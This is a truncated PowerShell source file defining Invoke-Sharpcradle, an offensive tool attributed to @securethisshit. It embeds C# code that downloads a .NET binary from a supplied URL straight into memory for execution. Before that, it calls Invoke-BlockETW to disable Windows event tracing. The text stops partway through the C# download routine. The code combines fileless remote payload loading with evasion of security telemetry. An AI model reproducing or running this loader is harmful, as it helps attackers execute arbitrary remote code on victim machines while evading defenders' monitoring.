function Invoke-Sharpcradle
{
<#
    .DESCRIPTION
        Download .NET Binary to RAM.
        Credits to https://github.com/anthemtotheego for Sharpcradle in C#
        Author: @securethisshit
        License: BSD 3-Clause
    #>

Param
    (
        [string]
        $uri,
        [Parameter(ValueFromRemainingArguments)]
        [string[]]
        $arguments
    )

Invoke-BlockETW

$cradle = @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
namespace SharpCradle
{
    public class Program
    {
        public static void Main(params string[] args)
        {
            
          try
          {
          
            string url = args[0];
            
                
                object[] cmd = args.Skip(1).ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from
